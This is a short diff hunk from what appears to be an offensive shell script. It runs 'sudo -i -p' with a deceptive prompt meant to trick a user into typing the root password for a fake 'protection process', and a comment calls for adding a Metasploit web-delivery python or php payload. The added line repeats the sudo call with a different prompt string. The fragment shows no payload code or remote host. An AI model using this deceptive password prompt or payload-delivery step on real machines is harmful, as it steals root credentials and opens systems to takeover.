@@ -84,6 +84,4 @@ read $target
 sudo -i -p There.is.something.dangerous.that.exists.in.the.root.password.to.allow.us.to.complete.the.protection.process ./update.sh
 sleep 3
 Put  Script web-delivery python php from Metasploit !!!! 
-
-
-
+sudo -i -p GihadAlkmatyhak5
